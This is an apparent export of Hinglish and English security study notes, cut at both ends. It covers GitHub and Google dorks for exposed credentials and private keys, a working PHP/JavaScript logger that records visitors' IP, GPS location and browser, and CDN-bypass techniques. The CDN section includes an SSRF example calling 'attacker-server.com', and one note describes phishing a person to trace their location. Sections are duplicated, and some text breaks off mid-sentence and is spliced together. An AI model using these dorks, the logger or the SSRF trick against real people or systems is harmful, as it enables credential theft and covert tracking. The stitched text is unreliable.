utor details |\n| Gather historical sensitive data | Even if deleted from recent commits    |\n\n---\n### 🔧 How to Perform GitHub Recon\n\n#### 1️⃣ Define the Target\n\n*   Organization, user, or project.\n\n*   Example: `org:examplecorp` or `user:username`\n\n#### 2️⃣ Use GitHub Search Dorks\n\n**🔑 Look for Secrets and Credentials**\n\n```\nfilename:.env\n```\n\n```\nfilename:config.json\n```\n\n```\nfilename:credentials\n```\n\n```\npath:**/.env\n```\n\n```\npath:**/config.json\n```\n\n```\npath:**/credentials\n```\n\n```\n\"aws_access_key_id\"\n```\n\n```\n\"aws_secret_access_key\"\n```\n\n```\n\"secret_key\"\n```\n\n```\n\"api_key\"\n```\n\n```\n\"client_secret\"\n```\n\n**🎯 Target Specific Users or Organizations**\n\n```\norg:examplecorp \"password\"\n```\n\n```\norg:examplecorp filename:config\n```\n\n```\nuser:username path:\"/config\" \"key\"\n```\n\n**🔐 Search for Common Password Patterns**\n```\n\"db_password\"\n```\n\n```\n\"ftp_password\"\n```\n\n```\n\"connectionstring\"\n```\n\n```\n\"security_credentials\"\n```\n\n**📂 File Types**\n```\nextension:sql mysql dump\n```\n\n```\nextension:json api|forecast.io\n```\n\n```\nextension:yaml mongolab.com\n```\n\n```\nfilename:id_rsa\n```\n\n```\nfilename:sshd_config\n```\n\n```\nfilename:wp-config.php\n```\n\n**🕓 Date Filters**\n\n```\ncreated:>2023-01-01\n```\n\n```\ncreated:2020-01-01..2022-12-31\n```\n\n### 🔑 Advanced GitHub Search Syntax\n\n| Operator     | Description                    | Example                       |\n| :----------- | :----------------------------- | :---------------------------- |\n| `filename:`  | Search by filename             | `filename:config.json`        |\n| `path:`      | Search by path                 | `path:config`                 |\n| `extension:` | Search by file extension       | `extension:sql`               |\n| `org:`       | Search within an organization  | `org:google`                  |\n| `user:`      | Search within a user account   | `user:admin`                  |\n| `language:`  | Filter by programming language | `language:python`             |\n| `in:`        | Search in specific fields      | `in:name, in:login, in:email` |\n| `created:`   | Filter by creation date        | `created:>2022-01-01`         |\n\n### 🧠 Example Dorks\n\n| Category                 | Example Queries                                                 |\n| :----------------------- | :-------------------------------------------------------------- |\n| 🤫 Secrets & Credentials | `\"aws_access_key_id\"`, `\"api_key\"`, `\"client_secret\"`           |\n| 🔑 Password Patterns     | `\"db_password\"`, `\"ftp_password\"`, `\"security_credentials\"`     |\n| 📂 Sensitive Files       | `filename:.env`, `filename:config.json`, `filename:credentials` |\n| 📄 File Extensions       | `extension:sql mysql dump`, `filename:id_rsa`                   |\n| 🎯 User/Org Targeting    | `org:examplecorp \"password\"`, `user:username path:\"/config\"`    |\n| 📅 Date-Based Search     | `created:>2023-01-01`                                           |\n\n### 🛠️ Tools for GitHub Recon\n---\n\n| Tool                   | Description                              | Link                                                        |\n| :--------------------- | :--------------------------------------- | :---------------------------------------------------------- |\n| GitLeaks               | Scan repositories for secrets            | [GitLeaks](https://github.com/gitleaks/gitleaks)            |\n| TruffleHog             | Find secrets in Git history              | [TruffleHog](https://github.com/trufflesecurity/truffleHog) |\n| Gitrob                 | Recon repositories for sensitive files   | [Gitrob](https://github.com/michenriksen/gitrob)            |\n| Gittyleaks             | Search for secrets in GitHub             | [Gittyleaks](https://github.com/kootenpv/gittyleaks)        |\n| Githound               | Hunt for sensitive information in GitHub | [Githound](https://github.com/tillson/git-hound)            |\n| Wraith                 | Scan GitHub orgs for secrets             | [Wraith](https://github.com/Nandaja/Wraith)                 |\n| GitHub Dorks           | Dork collections for GitHub              | [github-dorks](https://github.com/techgaun/github-dorks)    |\n| Random Robbie Keywords | Useful keyword list for searching        | [keywords](https://github.com/random-robbie/keywords)       |\n\n### 🔗 Resources\n*   🔥 [GitHub Dorks Collection](https://github.com/techgaun/github-dorks)\n*   🔥 [Random Robbie's Keyword List](https://github.com/random-robbie/keywords)\n*   🔥 [GitHub Recon Guide on Medium](https://infosecwriteups.com/a-guide-to-github-recon-9805459e1302)\n\n\n---\n----\n# GitHub dorks\n\nFind sensitive information accidentally pushed to public repos. \nThese are **advanced search queries** crafted to find:\n- API keys\n- Passwords\n- Config files\n- Sensitive endpoints\n- Internal docs\n- Private URLs\n\n---\n### 🔍 GitHub Dorks for Recon (2025 Edition)\n\n> Use them on:  \n> [https://github.com/search](https://github.com/search)\n\n---\n\n#### 🔑 API Keys / Tokens\n\n```bash\n\"api_key\" OR \"apikey\" OR \"api-key\" language:json\n```\n\n```\n\"secret_key\" OR \"access_token\" OR \"auth_token\"\n```\n\n```\n\"Authorization: Bearer\" language:python\n```\n\n```\n\"PRIVATE_KEY\" language:env\n```\n\n```\n\"firebaseio.com\" \"authDomain\"\n```\n\n```\n\"client_secret\" filename:*.json\n```\n\n---\n\n#### 🔐 Passwords & Credentials\n\n```bash\n\"password\" filename:.env\n```\n\n```\n\"password\" extension:php\n```\n\n```\n\"passwd\" OR \"pwd\" OR \"user\" OR \"login\" language:yaml\n```\n\n```\n\"ftp\" \"username\" \"password\"\n```\n\n```\n\"mysql_connect\" OR \"pg_connect\"\n```\n\n```\nfilename:config.json password\n```\n\n---\n\n#### ☁️ Cloud Keys (AWS, GCP, Azure)\n\n```bash\nAWS_SECRET_ACCESS_KEY\n```\n\n```\n\"aws_access_key_id\" \"aws_secret_access_key\"\n```\n\n```\n\"accessKeyId\" AND \"secretAccessKey\"\n```\n\n```\n\"google_api_key\" OR \"gcp_credentials\"\n```\n\n```\n\"AZURE_STORAGE_KEY\"\n```\n\n---\n\n#### ⚙️ Config / Env Files\n\n```bash\nfilename:.env\n```\n\n```\nfilename:.git-credentials\n```\n\n```\nfilename:.npmrc _auth\n```\n\n```\nfilename:config.yml password\n```\n\n```\nfilename:settings.py SECRET_KEY\n```\n\n---\n\n#### 🧠 Tech Stack Info\n\n```bash\nfilename:package.json\n```\n\n```\nfilename:requirements.txt\n```\n\n```\nfilename:composer.json\n```\n\n```\nfilename:pom.xml\n```\n\n---\n\n#### 🔗 Hidden/Internal URLs\n\n```bash\n\"internal-use-only\" OR \"do not distribute\"\n```\n\n```\nsite:github.com inurl:\"/internal\"\n```\n\n```\n\"admin\" inurl:login\n```\n\n```\n\"staging\" OR \"test\" OR \"dev\" inurl:subdomain\n```\n\n---\n\n#### 🛠 Hardcoded Credentials / URLs\n\n```bash\n\"jdbc:mysql://\"\n```\n\n```\n\"mongodb://\"\n```\n\n```\n\"POSTGRES_URL\"\n```\n\n```\n\"url\" AND \"token\"\n```\n\n---\n\n#### 📱 Mobile App Secrets\n\n```bash\n\"key\" filename:google-services.json\n```\n\n```\n\"client_secret\" filename:*.plist\n```\n\n```\n\"base64\" AND \"secret\"\n```\n\n---\n\n### ⛏ Tips for Use:\n\n- Use `user:orgname` to limit dorks to a company/org.\n    \n    ```\n    \"api_key\" user:examplecorp\n    ```\n    \n- Use `repo:username/repo` to target a specific project.\n    \n- Use filters like `created:>` or `pushed:>` to get recent leaks.\n    \n\n---\n\n### 🚨 Tools That Automate GitHub Recon:\n\n| Tool              | Purpose                   |\n| ----------------- | ------------------------- |\n| `github-dork.py`  | Automate GitHub dorking   |\n| `GitHound`        | Finds secrets via dorks   |\n| `TruffleHog`      | Scans repos for secrets   |\n| `GHunt`           | Info from GitHub profiles |\n| `repo-supervisor` | Prevent leaks in repos    |\n\n---\n---"}, {"name": "google dorks operators", "content": "## Google Dorks – Exploit Search Techniques\n---\nThe following are powerful Google Dork queries used to locate exposed directories, files, services, credentials, subdomains, and more. These are typically used for ethical hacking, OSINT, and reconnaissance.\n\nSource: [Exploit-DB Google Hacking Database](https://www.exploit-db.com/google-hacking-database)\n\n### Exposed Credentials and Secrets\n---\nSearches for `.env` files that often contain secrets like API keys or database credentials.\n```\ninurl:.env DB_PASSWORD\n```\n\nLocates JSON files with possible API keys.\n```\nfiletype:json intext:api_key\n```\n\nSearches for `.ini` files containing DB configurations.\n```\nfiletype:ini intext:db_user\n```\n\nTargets YAML config files with credentials.\n```\nfiletype:yaml intext:password\n```\n\nSearches for AWS keys in source code.\n```\nintext:\"AWS_SECRET_ACCESS_KEY\"\n```\n\n### Technology & Framework Detection\n---\nFinds WordPress admin panels.\n```\ninurl:wp-admin\n```\n\nSearches for exposed Laravel debug pages.\n```\ninurl:/_ignition/ intitle:\"Laravel\"\n```\n\nFinds Django error pages which can leak debug info.\n```\nintitle:\"OperationalError at\" inurl:/admin/\n```\n\nLocates Magento admin login pages.\n```\ninurl:admin/login site:.*.* -demo\n```\n\nTargets exposed `.git` folders.\n```\nintitle:\"index of /.git\"\n```\n\n### Login Panels & Access Portals\n---\nGeneral login portals:\n```\nintitle:\"Login Page\" inurl:login\n```\n\nAdmin login pages:\n```\nintitle:\"admin login\"\n```\n\nCPanel login panels:\n```\ninurl:cpanel filetype:php\n```\n\nRemote desktop logins:\n```\nintitle:\"Remote Web Workplace\"\n```\n\nRouter/web UI logins:\n```\nintitle:\"Router setup\" OR intitle:\"web interface login\"\n```\n\n### Misconfigurations & Debug Info\n---\nPHP info pages:\n```\ninurl:phpinfo.php\n```\n\nApache default pages:\n```\nintitle:\"Apache2 Ubuntu Default Page\"\n```\n\nJenkins dashboard:\n```\nintitle:\"Dashboard [Jenkins]\"\n```\n\nKibana dashboard exposed:\n```\nintitle:\"Kibana\" inurl:/app/kibana\n```\n\nExposed .DS_Store files:\n```\nintitle:\"Index of\" \".DS_Store\"\n```\n\n### Log, Backup, and Data ooks for `.env` files, which often contain application secrets like API keys and database credentials.\n```\nintitle:\"index of\" filetype:env\n```\n\nSearches for configuration files mentioning databases.\n```\nintitle:\"index of\" filetype:conf \"database\"\n```\n\nFinds `.json` files potentially containing configuration data.\n```\nintitle:\"index of\" filetype:json \"config\"\n```\n\nSearches for video files in open directories.\n```\nintitle:\"index of\" filetype:mp4 OR filetype:avi\n```\n\nLocates Word or PowerPoint files labeled as \"proposal.\"\n```\nintitle:\"index of\" filetype:docx OR filetype:pptx \"proposal\"\n```\n\nFinds `.log` files, often containing debugging or server information.\n```\nintitle:\"index of\" filetype:log\n```\n\nLocates `.ini` files, used for configurations.\n```\nintitle:\"index of\" filetype:ini\n```\n\nSearches for YAML configuration files.\n```\nintitle:\"index of\" filetype:yaml OR filetype:yml\n```\n\nFinds shell script files in open directories.\n```\nintitle:\"index of\" filetype:sh \"script\"\n```\n\nSearches for `.txt` files that may contain leaked usernames and passwords for Gmail accounts.\n```\nfiletype:txt username password @gmail.com\n```\n\nTargets `.txt` files with potential login credentials for Hotmail users.\n```\nfiletype:txt username password @hotmail.com\n```\n\nFinds leaked Yahoo email account details stored in `.txt` files.\n```\nfiletype:txt username password @yahoo.com\n```\n\nLocates plaintext credentials associated with Ymail accounts.\n```\nfiletype:txt username password @ymail.com\n```\n\nSearches for Rediffmail user credentials in `.txt` format.\n```\nfiletype:txt username password @rediffmail.com\n```\n\nTargets Facebook-associated accounts listed in `.txt` dumps.\n```\nfiletype:txt username password @facebook.com\n```\n\nSearches for Gmail credentials in Excel spreadsheets.\n```\nfiletype:xls username password @gmail.com\n```\n\nLocates Excel files with Hotmail account credentials.\n```\nfiletype:xl head - sabse kam volume bhi  4 8 char\ntoh ab hum operators ka use karte hai search volume kam karneke liye use google ke databse ko hack karna kehte hai\ngoogle ke pass sites ka data rehta hai\ntitle , url , description kr behalf pe google hame data lake deta hai\n\n# Google Hacking Database (GHDB) & Google Dorks\n\nGoogle Dorking (or Google Hacking) uses advanced Google search operators to discover publicly accessible sensitive data, configuration files, or vulnerabilities. This technique is widely used in cybersecurity, OSINT, penetration testing, and digital forensics.\n\n---\n## What Is the Google Hacking Database (GHDB)?\n\nThe **Google Hacking Database (GHDB)** is a repository of crafted Google search queries (a.k.a. **Google Dorks**) used to identify:\n\n• Exposed credentials  \n• Open directories  \n• Webcams and admin portals  \n• Backup/config files  \n• Database dumps\n\nGHDB GitHub Mirror: [readloud/Google-Hacking-Database](https://github.com/readloud/Google-Hacking-Database)\n\n---\n## Use Cases\n\n### Information Gathering\n\n• Locate login portals, config files, or directories.  \n• Discover hidden or forgotten content.\n\n### Open Source Intelligence (OSINT)\n\n• Identify leaks related to organizations or people.  \n• Extract emails, usernames, phone numbers.\n\n### Penetration Testing\n\n• Find known vulnerabilities via exposed panels or default pages.\n• Enumerate possible attack surfaces.\n\n### Bug Bounty Hunting\n\n• Discover exposed dev/staging environments.  \n• Check for misconfigured S3 buckets, Git directories, etc.\n\n## Why It Matters\n\n• **Proactive Defense**: Helps sysadmins identify leaks before attackers do.  \n• **Threat Intelligence**: Aids red teaming and incident response teams.  \n• **Security Awareness**: Organizations become more vigilant about exposure.\n\n## Popular Google Dork Patterns\n\n| Purpose | Dork Example |\n|---------|--------------|\n| Exposed Login Pages | `inurl:admin login` |\n| Directory Listing | `\"index of /\" site:example.com` |\n| Configuration Files | `ext:env` |\n| Database Dumps | `filetype:sql \"insert into\" -github` |\n| Logs with Credentials | `filetype:log intext:password` |\n| Exposed Cameras | `inurl:view/view.shtml` |\n| Search Within a Site | `site:example.com confidential` |\n| Find PDFs | `filetype:pdf \"internal use only\"` |\n| Public Git Repos | `inurl:.git -github` |\n| Open Backup Files | `ext:bak` |\n\n## Types of Google Search Operators\n\nGoogle Search Operators can be classified into two main categories:\n\n### Basic Operators\n\nThese are simple modifiers that help refine everyday search queries. They are commonly used by casual users to improve search relevance.\n\n#### Examples & Usage\n\n| Operator | Description | Example |\n|----------|-------------|---------|\n| `site:` | Restrict results to a specific website or domain | `site:example.com login` |\n| `intitle:` | Show pages with a specific word in the title | `intitle:admin` |\n| `inurl:` | Show pages with keywords in the URL | `inurl:login` |\n| `filetype:` / `ext:` | Search for a specific file type | `filetype:pdf report` |\n| `intext:` | Match text within the body content | `intext:\"confidential\"` |\n\n### Advanced Operators\n\nThese allow for **more complex and powerful queries**, primarily used by:\n\n• Cybersecurity professionals  \n• OSINT investigators  \n• Penetration testers  \n• Digital forensic analysts\n\n#### Examples & Usage\n\n| Operator | Description | Example |\n|----------|-------------|---------|\n| `allinurl:` | Search pages where all terms appear in the URL | `allinurl:admin login` |\n| `allintitle:` | Search pages where all terms are in the title | `allintitle:index of` |\n| `allintext:` | All specified words must appear in body text | `allintext:username password` |\n| `link:` | Find pages linking to a URL (limited use today) | `link:example.com` |\n| `related:` | Find sites related to a specified domain | `related:example.com` |\n| `*` (wildcard) | Acts as a placeholder for any unknown word | `\"password * gmail.com\"` |\n| `..` (range) | Search within a numeric range | `camera price 1000..5000` |\n\n### Summary Table\n\n| Type | Audience | Use Case Examples |\n|------|----------|-------------------|\n| Basic Operators | General Users | Refine search results, locate content |\n| Advanced Operators | IT Pros, Pentesters, Analysts | Find exposures, vulnerabilities, leaks |• Enumerate possible attack surfaces.\n\n### Bug Bounty Hunting\n\n• Discover exposed dev/staging environments.  \n• Check for misconfigured S3 buckets, Git directories, etc.\n\n## Why It Matters\n\n• **Proactive Defense**: Helps sysadmins identify leaks before attackers do.  \n• **Threat Intelligence**: Aids red teaming and incident response teams.  \n• **Security Awareness**: Organizations become more vigilant about exposure.\n\n---\n## Types of Google Search Operators\n\nGoogle Search Operators can be classified into two main categories:\n\n---\n\n## Google Search Basic Operators\n\nThese **basic search operators** help refine Google queries and improve search accuracy. Ideal for both casual and technical users.\n\n### + (Force Inclusion)\n\n> ▲ **Deprecated:** No longer supported in modern Google Search, but historically used to force inclusion of a term.\n\n*   **Purpose:** Ensure a specific keyword is included in results.\n*   **Example:**\n\n```\ncybersecurity +training\n```\n\nEnsures that the word \"**training**\" appears in the results.\n\n### - (Exclude Term)\n\n*   **Purpose:** Exclude specific words from search results.\n*   **Example:**\n\n```\ncybersecurity -training\n```\n\nOmits any results containing the word \"**training**\".\n\n### ~ (Suggest Similar Terms)\n\n> ▲ **Deprecated:** May not work reliably in current search behavior.\n\n*   **Purpose:** Search for synonyms and related terms.\n*   **Example:**\n```\n~hacking\n```\n\nReturns results for **hacking**, **security**, **penetration testing**, etc.\n\n### .. (Search Within a Range)\n\n*   **Purpose:** Search within a numeric range (years, prices, versions, etc.).\n*   **Example:**\n\n```\ncybersecurity trends 2015..2023\n```\n\nFinds results referencing years **2015 to 2023**.\n\n### * (Wildcard)\n\n*   **Purpose:** Acts as a placeholder for unknown or variable words.\n*   **Example:**\n\n```\nbest * security tools\n```\n\nMatches results like \"**best web security tools**\", \"**best cloud security tools**\", etc.\n\n### \" \" (Exact Match)\n\n*   **Purpose:** Search for an exact word or phrase.\n*   **Example:**\n\n```\n\"penetration testing guide\"\n```\n\nOnly returns pages with the **exact phrase** inside quotes.\n\n### OR (Logical Operator)\n\n*   **Purpose:** Show results that include **either** one term or the other.\n*   **Example:**\n\n```\nmalware OR virus\n```\n\nReturns pages containing \"**malware**\", \"**virus**\", or both.\n\n---\n### Tip: Combine Operators\n\nYou can **mix and match** multiple operators for powerful searches.\n\n**Example:**\n\n```\n\"cybersecurity guide\" -ebook filetype:pdf 2020..2024\n```\n\nFinds **PDF guides** about cybersecurity from **2020 to 2024**, **excluding eBooks**.\n\n---\n## Advanced Operators\n\nGoogle's advanced search operators help refine and target search queries with precision. They're widely used in cybersecurity, OSINT, bug bounty, and digital forensics investigations.\n\n### Search Rules\n---\n1.  **No Space Between Operator and Term**\n    Operators should be attached directly to the keyword.\n    Correct: `intitle:armourinfosec`\n    Incorrect: `intitle: armourinfosec`\n\n2.  **Case Insensitivity**\n    Google search is **not case-sensitive**.\n    `intitle:CyberSecurity` = `intitle:cybersecurity`\n\n3.  **Handling Multi-word Terms**\n    Use **double quotes (\" \")** or **dots (.)** for phrases.\n    Example:\n    *   `intitle:\"Ethical Hacking\"`\n    *   `inurl:ethical.hacking.tutorial`\n\n4.  **Combining Operators**\n    You can combine multiple operators for complex, targeted queries.\n    Example:\n```\nsite:github.com intitle:\"README\" intext:\"api_key\"\n```\n\n---\n### Key Advanced Operators\n---\n\n| Operator      | Description                                                           | Example                                 |\n| :------------ | :-------------------------------------------------------------------- | :-------------------------------------- |\n| `intitle:`    | Finds pages with the term in the **title**.                           | `intitle:\"cybersecurity training\"`      |\n| `allintitle:` | All specified terms must be in the title.                             | `allintitle:\"cybersecurity training\"`   |\n| `inurl:`      | Finds pages with the term in the **URL**.                             | `inurl:cybersecurity-training`          |\n| `allinurl:`   | All terms must appear in the URL.                                     | `allinurl:cybersecurity training`       |\n| `intext:`     | Finds pages with the term in the body **text**.                       | `intext:\"penetration testing\"`          |\n| `filetype:`   | Searches for a specific file type.                                    | `filetype:pdf \"cybersecurity training\"` |\n| `ext:`        | Similar to `filetype:` - used to specify file extensions.             | `ext:ppt \"cybersecurity training\"`      |\n| `site:`       | Limits search to a specific domain or site.                           | `site:armourinfosec.com`                |\n| `inanchor:`   | Finds terms used in anchor (link) text.                               | `inanchor:armourinfosec`                |\n| `link:`       | Finds pages linking to a specific page (limited functionality today). | `link:armourinfosec.com`                |\n| `cache:`      | Shows Google's cached version of a webpage.                           | `cache:armourinfosec.com`               |\n| `related:`    | Finds sites similar to the one specified.                             | `related:google.com`                    |\n| `info:`       | Provides information about a specific URL.                            | `info:armourinfosec.com`                |\n\n---\n### Example Queries Using `ext:` Operator\n---\n\n| Extension | Purpose | Example |\n| :--- | :--- | :--- |\n| `ext:pdf` | PDF documents | `ext:pdf \"ethical hacking tutorial\"` |\n| `ext:ppt` | PowerPoint slides | `ext:ppt \"cybersecurity training\"` |\n| `ext:doc` | Word documents | `ext:doc \"penetration testing report\"` |\n| `ext:xls` | Excel sheets | `ext:xls \"vulnerability assessment data\"` |\n| `ext:txt` | Text files | `ext:txt \"password list\"` |\n### Resource Reference\n---\n*   [Blackhat Europe PDF on Google Hacking](https://www.blackhat.com/presentations/bh-europe-05/BH_EU_05-Long.pdf)\n\n### Popular Google Dork Patterns\n---\n\n| Purpose | Dork Example |\n| :--- | :--- |\n| Exposed Login Pages | `inurl:admin login` |\n| Directory Listing | `\"index of /\" site:example.com` |\n| Configuration Files | `ext:env` |\n| Database Dumps | `filetype:sql \"insert into\" -github` |\n| Logs with Credentials | `filetype:log intext:password` |\n| Exposed Cameras | `inurl:view/view.shtml` |\n| Search Within a Site | `site:example.com confidential` |\n| Find PDFs | `filetype:pdf \"internal use only\"` |\n| Public Git Repos | `inurl:.git -github` |\n| Open Backup Files | `ext:bak` |\n\n### Example Scenarios\n---\n**1. Find Webcams**\n```\ninurl:view/view.shtml\n```\n\n**2. Discover Exposed .env Files**\n```\nfiletype:env intext:DB_PASSWORD\n```\n\n**3. Locate Login Pages**\n```\ninurl:admin | inurl:login | intitle:\"admin panel\"\n```\n\n**4. Search PDF Docs with Confidential Keywords**\n```\nfiletype:pdf \"confidential\" site:example.com\n```\n\n### Warning & Legal Note\n---\nGoogle Dorking should ONLY be used for ethical and authorized purposes.\n\n*   **Do:** Audit your own websites or use it in bug bounty programs you are authorized for\n*   **Don't:** Use this to access unauthorized systems or data.\n\nUnethical usage may violate:\n*   Terms of Service of search engines\n*   Local or international cybersecurity laws (e.g., CFAA, IT Act 2000)\n\n### Additional Resources\n---\n*   [Exploit-DB GHDB](https://www.exploit-db.com/google-hacking-database)\n*   [GitHub Repo - readloud/Google-Hacking-Database](https://github.com/readloud/Google-Hacking-Database)\n*   [OSINT Framework - Search Engines](https://osintframework.com/)\n---\n---"}, {"name": "gps logger", "content": "# GPS IP Logger with Google Map Preview (PHP + JS)\n\nThis setup captures a visitor's **IP address**, **GPS location** (with browser permission), and **User-Agent**, then logs it to a file along with a **Google Maps preview link**.\n\n## 🧱 File Structure\n\n```\n/gps-logger/\n├── index.html\n└── logger.php\n```\n\n## 📄 index.html\n\nRequests the user's GPS location and sends it to the PHP logger:\n\n```bash\nvim index.html\n```\n\n```html\n<!DOCTYPE html>\n<html>\n<head>\n    <title>GPS IP Logger</title>\n</head>\n<body>\n    <h2>Getting your GPS location ...</h2>\n    <p id=\"status\">Waiting for user permission ...</p>\n\n    [script]\n</body>\n</html>\n```\n\n## 📄 logger.php\n\nReceives the GPS coordinates, logs IP, time, and user-agent, and generates a Google Maps link.\n\t\t\n```bash\nvim logger.php\n```\n\n```php\n<?php\ndate_default_timezone_set('Asia/Kolkata');\n\n$lat = $_POST['lat'] ?? 'Not provided';\n$lon = $_POST['lon'] ?? 'Not provided';\n$ip = $_SERVER['REMOTE_ADDR'];\n$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';\n$time = date('Y-m-d H:i:s T');\n\n$mapLink = \"https://www.google.com/maps?q=$lat,$lon\";\n\n$log = <<<LOG\n<hr>\n<b>Time:</b> $time<br>\n<b>IP:</b> $ip<br>\n<b>Latitude:</b> $lat<br>\n<b>Longitude:</b> $lon<br>\n<b>Google Map:</b> <a href=\"$mapLink\" target=\"_blank\">View Location</a><br>\n<b>User-Agent:</b> $ua<br>\nLOG;\n\nfile_put_contents('gps-log.html', $log . PHP_EOL, FILE_APPEND | LOCK_EX);\n?>\n```\n\n## 🗂️ Sample Output in gps-log.html\n\n```html\n<hr>\n<b>Time:</b> 2025-07-04 17:37:02 IST<br>\n<b>IP:</b> 192.168.1.213<br>\n<b>Latitude:</b> 22.6957902<br>\n<b>Longitude:</b> 75.8338161<br>\n<b>Google Map:</b> <a href=\"https://www.google.com/maps?q=22.6957902,75.8338161\" target=\"_blank\">View Location</a><br>\n<b>User-Agent:</b> Mozilla/5.0 (Android 12; Mobile; rv:140.0) Gecko/140.0 Firefox/140.0<br>\n```\n\n```bash\ncat gps-log.html\n```\n\n---\n\n## 🔒 Important Notes\n\n- 📍 **GPS access requires user permission.**\n- 🌐 **Must be served over HTTPS to work in most browsers.**\n- 🚫 **Do not use this for unauthorized surveillance.**\n- 📱 **Works best on mobile devices with GPS enabled.**\n\n## 🔐 Optional: Protect the Log File\n\nTo restrict access to the log file:\n\n**.htaccess**\n\n```apache\n<Files \"gps-log.html\">\n    Order Allow,Deny\n    Deny from all\n</Files>\n```\n\n## 🚀 Deployment Tips\n\n- Use a free host like **Netlify**, **Vercel**, or **[GitHub Pages (with PHP support via backend)]**\n- Or run locally using PHP dev server:\n\n```bash\nphp -S localhost:8000\n```\n\n**Note:** `localhost` will not trigger GPS unless you use HTTPS.\n\n## ✅ Done!\n\nYou now have a fully working **GPS-based IP logger** with **Google Map preview** built using vanilla PHP and JavaScript.\n\n---\n---"}, {"name": "ip history cdn bypass", "content": "# IP Address History\n\nTools that show the historical IP address records (A records) a domain has pointed to.\n\n## ViewDNS IP History\n\nWebsite: https://viewdns.info/iphistory/\n\n### Lookup Example\n\nDomain: [armourinfosec.com](https://armourinfosec.com)\n\n```\nIP Address History:\n- 103.21.59.29 – First Seen: 2023-05-12, Last Seen: 2024-11-20\n- 162.241.123.20 – First Seen: 2022-01-05, Last Seen: 2023-05-11\n- 192.185.129.4 – First Seen: 2020-08-18, Last Seen: 2022-01-04\n```\n\n> Dates represent when ViewDNS first and last observed the domain resolving to each IP.\n\n## Use Cases\n\n- Investigating past hosting providers  \n- Detecting domain hijacking or infrastructure changes  \n- Attribution in security research  \n- Recon in penetration testing and OSINT  \n\n## Additional Tools for IP History\n\n| Tool           | Purpose                             | URL                             |\n| :------------- | :---------------------------------- | :------------------------------ |\n| SecurityTrails | Domain/IP/DNS history               | https://securitytrails.com/     |\n| DNSDumpster    | Passive DNS and subdomains          | https://dnsdumpster.com/        |\n| ViewDNS        | Ownership and registration timeline | https://viewdns.info/iphistory/ |\n| RiskIQ         | IP resolutions and asset history    | https://www.riskiq.com/         |\n\n---\n--- \n\nCDN Bypass – Techniques & Concepts\n---\n\n\n\nCDN (Content Delivery Network) is used to:\n\n- Cache content close to users\n- Mask the origin server's IP\n- Provide security features (WAF, rate-limiting, DDoS protection)\n\nCDN Bypass refers to techniques used to:\n\n- Discover the origin server IP\n- Interact directly with the backend server, bypassing CDN protections\n\n## Common CDN Bypass Techniques\n---\n### 1. Find the Origin IP\n\nUse recon tools to locate the real IP behind the CDN.\n\n#### a. DNS History / Passive DNS\n\nCheck historical A records before CDN was used:\n- [SecurityTrails](https://securitytrails.com/)\n- [ViewDNS IP History](https://viewdns.info/iphistory/)\n- [RiskIQ PassiveTotal](https://community.riskiq.com/)\n\n#### b. Subdomain Enumeration\nSome subdomains may not be behind the CDN:\n```\namass enum -d target.com\n```\n\n#### c. Shodan / Censys Search\nSearch by SSL cert, favicon hash, or headers:\n```\nssl.cert.subject.CN:\"target.com\"\nhttp.favicon.hash:123456789\n```\n- [shodan.io](https://www.shodan.io/)\n- [censys.io](https://search.censys.io/)\n\n#### d. Email/Webmail Leaks\nCheck email headers (e.g., password reset) which might reveal origin IP.\n\n#### e. Misconfigured DNS\nSometimes origin domain points directly to server IP (e.g., ftp.target.com).\n\n#### f. SSL Certificate Transparency Logs\nView issued certificates to discover hidden subdomains:\n- [crt.sh](https://crt.sh/)\n- [Certspotter](https://sslmate.com/certspotter/)\n\n---\n### 2. Test IP Candidates\n\nOnce you have potential origin IPs:\n- Use `curl` or `nmap` with Host header\n```\ncurl -H \"Host: target.com\" http://<origin_ip>\n```\nIf it returns the real site -> origin IP found.\n\n---\n### 3. Check Firewall Misconfigurations\n\nMisconfigured origin may accept direct traffic:\n- `iptables` or `fail2ban` not properly restricting to CDN IPs\n- Use tools like `wafw00f` to detect WAF presence/absence\n```\nwafw00f http://target.com\n```\n\n---\n### 4. Leaked Files or Git Repos\nSometimes `.git`, `.env`, or server files are exposed via other subdomains that bypass CDN.\n\n---\n### 5. Reveal Origin IP via Application Vulnerabilities\nInstead of finding the IP first, you can exploit certain vulnerabilities on the website itself (while it's still behind the CDN) to force the origin server to reveal its IP address. This is typically done by making the server initiate a connection to an external system that you control.\n\nKey vulnerabilities for this technique include:\n-   **SSRF (Server-Side Request Forgery):** This is the most common method. By exploiting an SSRF flaw, you can command the server to send a request to a URL you own. Your server's logs will then show the origin server's IP as the source of the request.\n-   **Command Injection:** If you can execute commands on the server, you can use utilities like `curl`, `wget`, or `ping` to make it contact your external server.\n-   **XXE (XML External Entity):** Similar to SSRF, XXE can be used to force the server to fetch an external resource, revealing its IP to you.\n\n**Example (using an SSRF vulnerability):**\n1. An attacker identifies an SSRF vulnerability in a feature on `target.com`.\n2. They craft a request that forces the server to connect to their own machine (e.g., `attacker-server.com`).\n```bash\n# The attacker sends this request to the public website\ncurl \"https://target.com/loadImage?url=http://attacker-server.com/reveal.txt\"\n```\n3. The attacker checks the access logs on `attacker-server.com`. The IP address that requested `/reveal.txt` is the real IP of the origin server, successfully bypassing the CDN's protection.\n---\n## Defense Tips (For Blue Team)\n---\n- Restrict origin IP to only accept traffic from CDN IP ranges (e.g., Cloudflare IP list)\n- Use firewall rules and allow-lists\n- Monitor DNS records for leaks\n- Regularly scan for exposed services and old records\n---\n---\n"}, {"name": "ip logger", "content": "kisi ne crime kara\nab samne wale ke pass uska ip gaya ab ip change hota regta hai toh me wo ip jisse fraud hua hai uska isp djhunduhuga\\\\\naur usser request karunga ki mujhe ye ip ki detaiils chaioye is smay pe kiske pass tha wo mujhe de denga \nab mujge person pata hau ab me phusing karunga us admi ka publlic ipp jannne ke liuye ab jaise hi usne kisi link pe click kiya uska public ip apne pass ip to location trace kar leneg kahatam kam\n\n# IP Logger\n\n---\n\n## What is an IP Logger?\n\nAn IP Logger is a tool or script used to **capture and record the IP address** of visitors who access a specific URL, webpage, or file.\n\n---\n\n## What It Does\n\nWhen someone visits a link or page containing an IP logger:\n\n- Their **IP address** is recorded\n- **Additional data may also be logged:**\n    - Timestamp\n    - Browser and OS (User-Agent)\n    - Referrer (where they came from)\n    - Page visited\n\n## Common Use Cases (Ethical & Legal Contexts)\n\n|Use Case|Description|\n|---|---|\n|Penetration Testing|Red teamers may use IP loggers to confirm if a target visited a phishing page|\n|Bug Bounty Recon|Researchers may track if certain links are accessed by security teams|\n|Traffic Analysis (with consent)|Site owners may log IPs for analytics, throttling, or regional 